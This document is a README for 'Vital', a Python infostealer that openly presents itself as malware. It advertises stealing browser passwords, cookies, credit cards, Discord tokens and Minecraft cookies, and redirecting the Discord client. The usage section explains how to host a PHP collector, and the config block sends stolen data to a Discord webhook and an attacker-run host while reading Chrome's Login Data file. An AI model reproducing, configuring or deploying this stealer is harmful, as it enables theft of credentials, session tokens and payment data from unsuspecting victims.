# Vital
- What is Vital?
  > Vital is malware primarily used to collect and
  > extract information from the Discord desktop client.
  > While it has other features (MC stealer, browser tools)
  > it really shines in this area.

- Overview of Vital
  > Vital has the ability to steal browser passwords, cookies, and credit cards.
  > It also collects Discord tokens, Minecraft client cookies and can redirect
  > the Discord client to an alternative web address.

- Support / coverage
  > Vital supports a plethora of Discord clients and browsers,
  > from commonly used browsers such as Chrome and Firefox to
  > lesser used browsers such as (i don't know)

# Usage
Setup a webserver on either a local machine or a remote machine, hosting the
PHP file. Once you have your local server setup, make sure to configure everything
**__properly__** inside of `main.py`. 

- Example
```python
WEBHOOK 	    = 	'https://discord.com/webhooks/idontfuckingknow' 									      # Discord webhook URL
REDIRECT 	    = 	'' 									                                                    # Optional redirect to website
HOST	 	      = 	'http://mydomain.org/' 									                                # Server host URL (e.g: http://127.0.0.1/)
CHROME_DATA 	=	  '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	    # Chrome login data path
USERNAME	    =	  os.environ.get('USERNAME')						                                  # Username environment variable
APPDATA		    =	  os.getenv('APPDATA')							                                      # Appdata environment variable

DEBUG 		    = 	False									                                                  # Enable or disable debugging
```

After this you can execute `main.py` and watch the magic happen!
